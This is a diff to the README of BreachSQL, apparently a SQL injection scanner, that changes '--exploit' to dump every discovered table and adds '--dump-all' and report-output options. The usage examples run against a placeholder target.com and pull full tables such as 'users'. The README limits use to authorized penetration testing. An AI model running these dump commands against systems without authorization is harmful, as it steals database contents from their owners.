@@ -18,10 +18,10 @@
 python3 -m venv .venv && source .venv/bin/activate
 pip install breachsql
 
-# Scan and exploit in one pass
+# Scan, exploit, and dump everything — outputs written to target.com/
 breachsql -u "https://target.com/item?id=1" --exploit
 
-# Dump a table straight from the finding
+# Dump a specific table straight from the finding
 breachsql -u "https://target.com/item?id=1" --dump users
 ```
 
@@ -32,7 +32,7 @@ breachsql -u "https://target.com/item?id=1" --dump users
 ## Why BreachSQL?
 
 - **Faster** — binary-search boolean extraction, parallel surface probing, no per-request sleep loops
-- **Detect → exploit in one pass** — `--exploit` extracts version, user, database, and tables immediately after a confirmed hit; `--dump TABLE` pulls rows without a second invocation
+- **Detect → exploit in one pass** — `--exploit` dumps every discovered table and writes `.txt`, `.json`, and `.html` outputs to a `<host>/` folder automatically; `--dump TABLE` targets a single table
 - **Python API** — `from breachsql.engine import scan, ScanOptions` — embed it directly in your own tooling or scripts
 - **Scan from spec** — `--openapi` imports every endpoint from a Swagger/OpenAPI file and scans them all
 - **Curated payloads** — backed by [commonhuman-payloads](https://github.com/CommonHuman-Lab/commonhuman-payloads), an auditable, versioned payload library shared across the toolchain
@@ -65,11 +65,14 @@ breachsql -u "https://target.com/search?name=x" --technique T --time-threshold 3
 # Specific backend and technique
 breachsql -u "https://target.com/users?id=1" --dbms mysql --technique E
 
-# Extract version, current user, database name, and table list after detection
+# Exploit: dump every table, write target.com/{txt,json,html} automatically
 breachsql -u "https://target.com/users?id=1" --exploit
 
-# Dump all rows from a specific table
+# Dump all rows from a specific table (implies --exploit)
 breachsql -u "https://target.com/users?id=1" --dump users
+
+# Dump every table, save results to a custom output stem
+breachsql -u "https://target.com/users?id=1" --dump-all -o results/target
 
 # Full multi-technique scan
 breachsql -u "https://target.com/report?id=1" --dbms mysql --technique EBTUS --level 2 --risk 2
@@ -142,9 +145,11 @@ for f in result.error_based:
 | `--login-pass` | — | Password for form login |
 | `--openapi` | — | OpenAPI/Swagger spec file or URL — imports endpoints to scan |
 | `--browser-crawl` | — | Headless Chromium endpoint discovery (requires selenium) |
-| `--exploit` | — | After detection, extract version / current user / database name / table list |
+| `--exploit` | — | Dump every discovered table; auto-creates `<host>/` and writes `<host>.txt`, `<host>.json`, `<host>.html` |
 | `--dump TABLE` | — | Dump all rows from TABLE using a confirmed injection point (implies `--exploit`) |
-| `-o` | — | Write findings to JSON file |
+| `--dump-all` | — | Dump every discovered table (implies `--exploit`); use with `-o` to control output path |
+| `-o` | — | Output stem — writes `<name>.txt`, `<name>.json`, `<name>_dump.json` |
+| `--report-html` | — | Write a self-contained HTML report to this file |
 
 ---
 
@@ -182,7 +187,7 @@ Requires Python 3.10+. No C extensions. On Kali and other Debian-based systems, 
 
 Only run BreachSQL against applications you own or have explicit written authorization to test. Authorized use includes penetration testing engagements, bug bounty programs within defined scope, and CTF competitions.
 
-`--exploit` and `--dump` extract live database content — only use them where data extraction is explicitly permitted by your engagement scope.
+`--exploit`, `--dump`, and `--dump-all` extract live database content — only use them where data extraction is explicitly permitted by your engagement scope.
 
 The authors accept no liability for unauthorized or illegal use.
 
